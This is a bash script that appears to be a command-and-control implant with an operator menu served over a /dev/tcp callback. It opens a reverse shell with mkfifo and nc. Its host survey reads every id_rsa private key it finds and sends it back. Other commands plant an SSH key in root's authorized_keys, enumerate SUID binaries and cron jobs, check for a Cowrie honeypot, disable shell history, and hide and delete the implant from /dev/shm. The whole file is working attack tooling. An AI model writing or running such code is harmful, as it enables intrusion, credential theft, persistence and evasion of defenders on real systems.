#!/bin/bash
red='\e[31m'
lred='\e[91m'
green='\e[32m'
lgreen='\e[92m'
yellow='\e[33m'
lyellow='\e[93m'
blue='\e[34m'
lblue='\e[94m'
magenta='\e[35m'
lmagenta='\e[95m'
cyan='\e[36m'
lcyan='\e[96m'
grey='\e[90m'
lgrey='\e[37m'
white='\e[97m'
black='\e[30m'
##)
#( bg
b_red='\e[41m'
b_lred='\e[101m'
b_green='\e[42m'
b_lgreen='\e[102m'
b_yellow='\e[43m'
b_lyellow='\e[103m'
b_blue='\e[44m'
b_lblue='\e[104m'
b_magenta='\e[45m'
b_lmagenta='\e[105m'
b_cyan='\e[46m'
b_lcyan='\e[106m'
b_grey='\e[100m'
b_lgrey='\e[47m'
b_white='\e[107m'
b_black='\e[40m'
##)
#( special
reset='\e[0;0m'
bold='\e[01m'
italic='\e[03m'
underline='\e[04m'
inverse='\e[07m'
conceil='\e[08m'
crossedout='\e[09m'
bold_off='\e[22m'
italic_off='\e[23m'
underline_off='\e[24m'
inverse_off='\e[27m'
conceil_off='\e[28m'
crossedout_off='\e[29m'
unset HISTFILE

ready () {
  eval 'printf "${lgreen}Ready:\r\nEnter help to see menu:${reset} \r\n" >&3;'
}


while [ true ]; do

    arr[0]="127.0.0.1"
        svr=${arr[0]}

        eval 'exec 3<>/dev/tcp/$svr/9001;'
        if [[ ! "$?" -eq 0 ]] ; then
            continue
        fi

    eval 'printf "${red}$(date)${reset}\r\n" >&3;'

    if [[ ! "$?" -eq 0 ]] ; then
            continue
        fi
        eval 'printf "${bold}Agent Name:${bold_off} $(md5sum /etc/passwd | cut -d '/' -f1)\r\n" >&3;'
    eval 'ready >&3;'
        if [[ ! "$?" -eq 0 ]] ; then
            continue
        fi
  
        while [ true ]; do
            eval "read msg_in <&3;"

                if [[ ! "$?" -eq 0 ]] ; then
                    break
                fi

                if  [[ "$msg_in" =~ "ping" ]] ; then
                    eval 'printf "${green}succ %s${reset}\r\n" "${msg_in:5}" >&3;'
                        if [[ ! "$?" -eq 0 ]] ; then
                            break
                        fi
                        sleep 1
                        eval 'printf "${green}joined${reset}\r\n\r\n" >&3;'
            eval 'ready >&3;'

                        if [[ ! "$?" -eq 0 ]] ; then
                                break
                        fi
            elif [[ "$msg_in" =~ "help" ]] ; then
            eval 'printf "${bold}Help Menu:${bold_off}\r\n${bold}ping${bold_off} [*] check connection\r\n${bold}date${bold_off} [*] print UTC date time + local device time\r\n${bold}hide${bold_off} [*] hide implant in /dev/shm, run in memory, delete implant\r\n${bold}survey${bold_off} [*] conduct host survey\r\n${bold}cronj${bold_off} [*] investigate cron jobs\r\n${bold}rsyslog${bold_off} [*] check for remote logging\r\n${bold}cgroup${bold_off} [*] see cgroups\r\n${bold}sshkey${bold_off} [*] store ssh pub key in /root/.ssh/\r\n${bold}ld${bold_off} [*] dir listing\r\n${bold}honeypot${bold_off} [*] check for cowrie honeypot\r\n${bold}help${bold_off} [*] display commands\r\n${bold}ps${bold_off} [*] process list tree\r\n${bold}netstat${bold_off} [*] view connections\r\n${bold}users${bold_off} [*] see logged on users\r\n${bold}shell${bold_off} [*] spawn remote shell\r\n${bold}traceroute${bold_off} [*] see path to remote machine\r\n${bold}exit${bold_off} [*] quit session\r\n\r\n" >&3;'
            eval 'ready >&3;'

        elif [[ "$msg_in" =~ "traceroute" ]] ; then
            eval 'printf "traceroute 8.8.8.8: $(traceroute 8.8.8.8 > /tmp/trace)\r\n" >&3;'
            sleep 3
            eval 'printf "getting data: $(cat /tmp/trace)\r\n" >&3;'
            rm /tmp/trace
            eval 'ready >&3;'

        elif [[ "$msg_in" =~ "shell" ]]; then
            eval 'printf "Start a listener on 9002:\r\n" >&3;'
            sleep 10
            eval '$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 127.0.0.1 9002 >/tmp/f)'
            eval 'ready >&3;'
       
        elif [[ "$msg_in" =~ "date" ]]; then 
            eval 'printf "${bold}Date/Time (local + utc):${bold_off}\r\n$(date; date -u)\r\n" >&3;'

        elif [[ "$msg_in" =~ "cronj" ]]; then
            eval 'printf "${bold}${green}cron tasks writable by user:${reset}\r\n$(find -L /etc/cron* /etc/anacron /var/spool/cron -writable 2>/dev/null)\r\n" >&3;'
            eval 'printf "${bold}${green}cron jobs:${reset}\r\n$(grep -ERv "^(#|$)" /etc/crontab /etc/cron.d/ /etc/anacrontab 2>/dev/null)\r\n" >&3;'
            eval 'printf "${bold}${green}can we read user crontabs:${reset}\r\n$(ls -la /var/spool/cron/crontabs/* 2>/dev/null || echo "permission denied")\r\n\n" >&3;'

        elif [[ "$msg_in" =~ "rsyslog" ]]; then
            eval 'printf "${bold}${green}checking rsyslog:${reset}\r\n$(cat /etc/rsyslog.conf 2>/dev/null | grep -v "^#" || echo "permission denied")\r\n" >&3;'

        elif [[ "$msg_in" =~ "ld" ]]; then
           eval 'printf "Dir: $(pwd)\r\n" >&3;'
           eval 'printf "Listing: $(ls -lartF)\r\n" >&3;'
           eval 'ready >&3;'

   
        elif [[ "$msg_in" =~ "users" ]]; then
            eval 'printf "Logged on users: $(w)\r\n" >&3;'
            eval 'ready >&3;'

        elif [[ "$msg_in" =~ "honeypot" ]]; then
            eval 'printf "${green}Starting honeypot checks:${reset}\r\n" >&3;'
            view=$(which cat)

            if [ "$($view /etc/hostname | grep srv04)" ]; then
                eval 'printf "${red}Honeypot detected!!!${reset}\r\n" >&3;'
                    exit 4
            else
                    eval 'printf "Hostname is NOT srv04\r\n" >&3;'
            fi
            look=$(which ls)
            if [ "$($look /home | grep 'phil' && $view /proc/version | grep "Debian 4.")" ]; then 
                eval 'printf "${red}Honeypot detected!!!${reset}\r\n" >&3;'
                    exit 5
            else
                    eval 'printf "No phil user detected\r\n" >&3;'
            fi
            if [ "$(which file)" ]; then
                    eval 'printf "file command on the box\r\n" >&3;'
            else      
                eval 'printf "${red}Honeypot detected!!!${reset}\r\n" >&3;'
                    exit 6
            fi
            fake=$(ping -c 4 999.999.999.999 | grep "64 bytes" | cut -d " " -f1,2)
            if [ "$fake" ];then 
                eval 'printf "${red}Honeypot detected!!!${reset}\r\n" >&3;'
                    exit 7
            else
                    eval 'printf "Fake internet not detected\r\n" >&3;'
                eval 'printf "${green}Honey pot checks over, no cowrie hp detected${reset}\n\r" >&3;'
                eval 'ready >&3;'
            fi
        elif [[ "$msg_in" =~ "ps" ]]; then
            eval 'printf "Process list: $(ps -ef 2>/dev/null)\r\n" >&3;'
            eval 'ready >&3;'

        elif [[ "$msg_in" =~ "netstat" ]]; then
            eval 'printf "Connections: $(netstat -antpu 2>/dev/null || ss -tulwn 2>/dev/null)\r\n" >&3;'
            eval 'ready >&3;'

        elif [[ "$msg_in" =~ "cgroup" ]]; then
            eval 'printf "cgroup: $(systemd-cgls --no-pager 2>/dev/null)\r\n" >&3;'
            eval 'ready >&3;'

        elif [[ "$msg_in" =~ "sshkey" ]]; then
            perms=$(id | grep uid | cut -d ' ' -f1 | cut -d '=' -f2 | cut -d '(' -f1)
            if [ $perms -eq 0 ]; then
                mkdir -p /root/.ssh 2>/dev/null
                echo "SSH_KEY_HERE"  >> /root/.ssh/authorized_keys
                eval 'printf "Sending authorized_keys file back: $(cat /root/.ssh/authorized_keys)\r\n" >&3;'
                eval 'ready >&3;'
            else
                eval 'printf "You are not root!! SSH Key not added\r\n" >&3;'
                eval 'ready >&3;'
            fi 
        elif [[ "$msg_in" =~ "survey" ]]; then
            eval 'printf "${bold}${green}public ip information:${reset}\n$(curl ipinfo.io 2>/dev/null; sleep 1)\r\n\n" >&3;'
            eval 'printf "${bold}${green}ip information:\n${reset}$(ip a | ifconfig)\r\n\n" >&3;'
            eval 'printf "${bold}${green}perms:\n${reset}$(id)\r\n\n" >&3;'
            eval 'printf "${bold}${green}suid binaries:\n${reset}$(find / -perm -u=s -type f 2>/dev/null)\r\n\n" >&3;'

            eval 'printf "${bold}${green}os, kernel:\n${reset}$(uname -a)\r\n\n" >&3;'
            eval 'printf "${bold}${green}crontab:\r\n${reset}$(crontab -l | grep -Ev "^#")\r\n\n" >&3;'
            eval 'printf "${bold}${green}ssh keys:\n${reset}$(find / -type f -name "id_rsa" 2>/dev/null -exec cat {} \;)\r\n\n" >&3;'
            eval 'printf "${bold}${green}connections:\n${reset}$(netstat -antpu 2>/dev/null || ss -tulwn 2>/dev/null)\r\n" >&3;'
            eval 'printf "${bold}${green}process list:\n${reset}$(ps -ef 2>/dev/null)\r\n" >&3;'
            eval 'ready >&3;'

        elif [[ "$msg_in" =~ "exit" ]]; then
            eval 'printf "${bold}${red}implant exiting, goodbye${reset}\r\n" >&3;'
            exit 0
        elif [[ "$msg_in" =~ "hide" ]]; then
            eval 'printf "${bold}implant hiding, will call back shortly on the same port${reset}\r\n" >&3;'
            mv implant.sh /dev/shm
            sleep 5
            source /dev/shm/implant.sh || bash /dev/shm/implant.sh
            sleep 5 
            rm /dev/shm/implant.sh
            
            exit 0
             
        else
            eval 'printf "${red}That is not a valid command:${reset}\r\n" >&3;'      
                fi
        done
done

